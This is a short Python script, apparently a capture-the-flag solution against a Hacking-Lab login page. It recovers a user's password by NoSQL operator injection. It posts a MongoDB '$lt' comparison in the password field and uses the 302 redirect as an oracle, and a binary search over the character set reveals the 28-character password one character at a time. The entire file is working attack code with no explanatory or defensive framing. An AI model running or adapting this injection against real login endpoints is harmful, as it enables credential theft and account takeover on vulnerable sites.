import requests
import string
import time

LOGIN_URL = "http://whale.hacking-lab.com:3371/login"

USERNAME = "null"
PASSWORD_LEN = 28
# [0-9A-Za-z_]
PASSWORD_CHARSET = sorted(string.digits + string.ascii_letters + "_")


def less_than(password_guess):
    # Sleep to be nice to server :)
    time.sleep(1)
    # Pad guess to be PASSWORD_LEN long
    password_guess = password_guess.ljust(PASSWORD_LEN, "!")
    payload = {"username": USERNAME, "password": {"$lt": password_guess}}
    r = requests.post(LOGIN_URL, json=payload, allow_redirects=False)
    return (r.status_code == 302)


def pick_middle(chs):
    """
    Returns the middle element of a list, or the higher index if tied.

    >>> pick_middle([1, 2, 3])
    2
    >>> pick_middle([1, 2])
    2
    """
    idx = len(chs) // 2
    return chs[idx]


def split_middle(chs):
    """
    Returns a tuple split at the middle, or at the higher index if tied.

    >>> split_middle([1, 2, 3])
    ([1], [2, 3])
    >>> split_middle([1, 2])
    ([1], [2])
    """
    idx = len(chs) // 2
    return chs[:idx], chs[idx:]


def main():
    password = ""
    for _ in range(PASSWORD_LEN):
        charset = PASSWORD_CHARSET.copy()
        while len(charset) > 1:
            ch = pick_middle(charset)
            guess = password + ch
            print(guess, charset)
            if less_than(guess):
                charset, _ = split_middle(charset)
            else:
                _, charset = split_middle(charset)
        password += charset[0]
        print("=>", password)


if __name__ == "__main__":
    main()
